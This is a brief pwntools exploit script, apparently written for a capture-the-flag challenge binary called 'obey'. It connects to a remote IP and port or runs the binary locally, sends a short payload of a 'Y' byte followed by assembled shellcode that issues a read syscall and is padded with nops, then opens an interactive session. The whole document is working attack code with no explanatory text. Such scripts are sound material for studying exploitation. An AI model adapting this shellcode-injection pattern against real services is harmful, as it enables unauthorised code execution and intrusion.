from pwn import *

e = ELF("./obey")

context.binary = e.path

if "--remote" in sys.argv:
  p = remote("138.68.67.161", 20001)
else:
  p = process(e.path)

p.recvuntil("Obey?")

pay = ("Y\x00" + asm("""

  mov rdi, r13
  xor rax, rax
  xor rdi, rdi
  syscall
""")).ljust(0xb, asm("nop"))

print("Len: " + str(len(pay)))

gdb.attach(p)
p.send(pay)






p.interactive()
